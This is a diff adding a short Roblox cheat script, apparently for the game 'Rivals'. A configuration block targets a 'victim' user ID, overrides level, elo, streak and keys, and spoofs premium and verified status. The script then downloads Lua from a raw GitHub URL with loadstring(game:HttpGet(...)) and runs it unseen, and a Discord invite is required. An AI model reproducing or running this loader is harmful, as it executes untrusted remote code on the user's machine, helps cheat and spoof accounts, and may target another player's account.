@@ -1,0 +1,15 @@
+getgenv().Config = {
+    victim = 469217078,             -- victim userid only
+    helper = "",                   -- helper yopirxcy (yopirxcy)
+    level = 401,                    -- level override
+    streak = 1000,                   -- winstreak override (0 = disabled)
+    elo = 10010,                       -- elo override (0 = disabled)
+    keys = 5000,                     -- keys override (3976 =  disabled)
+    premium = true,               -- spoof premium
+    verified = false,              -- spoof verified badge
+    unlockall = true,              -- unlock all
+    platform = "MOBILE",               -- DESKTOP / MOBILE / CONSOLE / VR
+    join = "discord.gg/rivalscomp" -- remove this and the script won't work
+}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/WEFGQERQEGWGE/a/refs/heads/main/UDRCRFRAMESCRIPT.lua"))()
